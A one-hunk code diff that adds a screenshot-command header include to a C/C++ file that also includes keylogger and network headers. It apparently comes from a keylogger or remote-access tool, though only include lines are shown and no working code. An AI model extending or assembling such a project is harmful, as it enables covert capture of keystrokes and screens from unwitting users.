@@ -1,4 +1,5 @@
 #include "stdafx.h"
+#include "Command_screenshot.h"
 #include "Keylogger.h"
 #include "Network.h"
 #include "Settings.h"
